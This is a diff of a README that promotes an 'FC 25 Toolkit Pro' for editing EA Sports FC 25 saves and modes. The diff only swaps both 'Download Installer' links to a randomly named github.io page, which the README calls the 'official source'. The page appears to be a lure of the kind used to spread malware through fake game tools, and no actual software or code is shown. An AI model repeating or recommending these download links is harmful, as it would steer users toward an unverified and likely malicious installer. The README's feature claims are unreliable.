@@ -2,7 +2,7 @@
 
 Unlock the full potential of your EA Sports FC 25 experience on PC with the FC 25 Toolkit Pro. This comprehensive suite provides a powerful set of tools for save editing, gameplay customization, and deep modification of your career and ultimate team modes, giving you unparalleled control over your virtual football world.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside: Key Features
 
@@ -54,7 +54,7 @@ By default, the toolkit saves your modified files in the same directory as your 
 
 For the safest and most reliable download, always use the official source.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: November 15, 2026 | Toolkit Version: 2.5.1*
